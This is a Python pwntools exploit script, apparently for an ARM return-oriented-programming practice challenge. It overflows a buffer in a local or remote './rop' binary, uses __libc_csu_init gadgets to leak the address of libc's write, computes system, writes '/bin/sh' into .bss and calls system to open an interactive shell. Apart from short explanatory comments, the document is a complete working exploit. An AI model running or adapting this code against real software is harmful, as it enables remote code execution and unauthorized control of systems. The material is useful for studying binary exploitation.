#!/usr/bin/env python

from pwn import *
import sys

if len(sys.argv) > 1:
	p = remote('192.168.0.5', 23333)
else:
	p = process('./rop')

p.recvuntil("Welcome to arm ROP!\n")

rop = ELF('./rop')
libc = ELF('./libc.so.6')
write_plt = rop.symbols['write']
write_got = rop.got['write']
vlun_addr = rop.symbols['vuln']
bss_addr = 0x2102c
read_got = rop.got['read']
#leaking function write's address
'''
Just like rop in x86_64, let's see __libc_csu_init:
.text:000104F8                 ADD     R4, R4, #1
.text:000104FC                 LDR     R3, [R5],#4
.text:00010500                 MOV     R2, R9
.text:00010504                 MOV     R1, R8
.text:00010508                 MOV     R0, R7
.text:0001050C                 BLX     R3              ; frame_dummy
.text:00010510                 CMP     R6, R4
.text:00010514                 BNE     loc_104F8
.text:00010518                 LDMFD   SP!, {R4-R10,PC}
Surprised? yes, do as you've learned!
'''

ldmfd_addr = 0x10518
call_addr = 0x104f8
#write(1, write_got, 4)
r0 = r7 = 1
r1 = r8 = write_got
r2 = r9 = 4
r4 = 0
r5 = write_got
r6 = 1
r10 = 0
pc = vlun_addr
# attention, bp points to the return-address on the stack
# when calling a function, bp(r11) is not necessary sometimes, but
# lr must be pushed into stack.
payload = 'a'*0x24 + p32(ldmfd_addr) + p32(r4) + p32(r5) + p32(r6)
payload += p32(r7) + p32(r8) + p32(r9) + p32(r10) + p32(call_addr)
payload += p32(0)*7 + p32(vlun_addr)

raw_input('go')
p.sendline(payload)
write_addr = u32(p.recv(4))
print "[+] write_addr: " + hex(write_addr)

offset = libc.symbols['write'] - libc.symbols['system']
system_addr = write_addr - offset
print "[+] system_addr: " + hex(system_addr)

r0 = r7 = 0
r1 = r8 = bss_addr
r2 = r9 = 100
r4 = 0
r5 = read_got
r6 = 1
r10 = 0
pc = vlun_addr
payload1 = 'b'*0x24 + p32(ldmfd_addr) + p32(r4) + p32(r5) + p32(r6)
payload1 += p32(r7) + p32(r8) + p32(r9) + p32(r10) + p32(call_addr)
payload1 += p32(0)*7 + p32(vlun_addr)

p.sendline(payload1)
sleep(0.5)
p.sendline(p32(system_addr) + '/bin/sh\x00')
sleep(0.5)

r0 = r7 = bss_addr + 4
r1 = r8 = 0
r2 = r9 = 0
r4 = 0
r5 = bss_addr
r6 = 1
r10 = 0
pc = vlun_addr
payload3 = 'b'*0x24 + p32(ldmfd_addr) + p32(r4) + p32(r5) + p32(r6)
payload3 += p32(r7) + p32(r8) + p32(r9) + p32(r10) + p32(call_addr)
payload3 += p32(0)*7 + p32(0xdeadbeef)

p.sendline(payload3)

p.interactive()







